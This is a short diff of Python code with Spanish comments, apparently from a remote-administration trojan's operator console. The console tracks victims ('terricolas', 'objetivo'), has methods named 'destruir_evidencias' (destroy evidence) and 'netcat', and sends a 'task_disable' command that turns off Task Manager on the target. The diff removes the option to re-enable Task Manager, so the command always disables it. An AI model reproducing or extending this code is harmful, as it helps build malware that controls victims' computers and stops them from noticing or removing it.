@@ -316,7 +316,6 @@ class Server(Thread):
 		return
 
 
-
 	# --------- DETENER SERVIDOR ---------
 
 	def destruir_evidencias(self):
@@ -345,9 +344,6 @@ class Control():
 		self.objetivo = servidor.terricolas[client][0]
 		self.hostname = servidor.terricolas[client][2]
 
-		# Variables globales del objeto
-
-		self.taskManagerDisable = False
 
 	# MODULOS EXTRAS
 
@@ -401,26 +397,11 @@ class Control():
 		self.servidor.recibir(self.objetivo)
 		time.sleep(0.01)
 
-		if self.taskManagerDisable==False:
-			# Envia a cliente que se deshabilite el Tmgr
-			self.taskManagerDisable=True
-			self.servidor.enviar(self.objetivo,"task_disable")
-			msg = self.servidor.recibir(self.objetivo)
-			print(msg)
-			return
-
-		else:
-			activar = (input(" El administrador de tareas se encuentra deshabilitado. Desea habilitarlo? (s/n): ")).lower()
-			while (activar!="s") and (activar!="n"):
-				print (" Opcion inexistente. Intente nuevamente...")
-				activar = (input(" El administrador de tareas se encuentra deshabilitado. Desea habilitarlo? (s/n): ")).lower()
-
-			if (activar=="s"):
-				self.taskManagerDisable=False
-				self.servidor.enviar(self.objetivo,"task_enable")
-				msg = self.servidor.recibir(self.objetivo)
-				print(msg)
-				return
+		# Envia a cliente que se deshabilite el Tmgr
+		self.servidor.enviar(self.objetivo,"task_disable")
+		msg = self.servidor.recibir(self.objetivo)
+		print(msg)
+		return
 
 
 	def netcat(self):
